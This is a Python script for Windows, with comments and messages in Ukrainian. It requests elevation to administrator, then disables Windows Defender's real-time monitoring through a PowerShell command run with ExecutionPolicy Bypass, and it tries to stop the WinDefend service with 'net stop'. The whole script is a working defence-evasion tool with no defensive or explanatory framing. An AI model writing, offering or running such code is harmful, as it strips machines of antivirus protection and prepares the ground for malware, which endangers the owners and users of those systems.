import ctypes
import os
import subprocess
import sys
import win32com.client

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

def run_as_admin():
    if not is_admin():
        try:
            # Запуск цього ж скрипта з правами адміністратора
            script = os.path.abspath(__file__)
            params = ' '.join([script] + sys.argv[1:])
            python = sys.executable
            ctypes.windll.shell32.ShellExecuteW(None, "runas", python, script, None, 1)
        except Exception as e:
            print(f"Не вдалося запустити з правами адміністратора: {e}")
            sys.exit(1)
        sys.exit(0)

def disable_windows_defender():
    try:
        # Вимкнення захисту в реальному часі через PowerShell
        subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], check=True)

        # Спроба зупинити службу Windows Defender
        subprocess.run(['net', 'stop', 'WinDefend'], check=True)
        print("Windows Defender успішно вимкнено.")
    except subprocess.CalledProcessError as e:
        if e.returncode == 2:
            print("Служба Windows Defender не знайдена або вже вимкнена.")
        elif e.returncode == 5:
            print("Доступ заборонено. Спробуйте запустити з правами адміністратора.")
        else:
            print(f"Помилка при вимкненні Windows Defender: {e}")



if __name__ == '__main__':
    run_as_admin()  # Перевірка та запуск з правами адміністратора
    disable_windows_defender()  # Спроба вимкнути Windows Defender
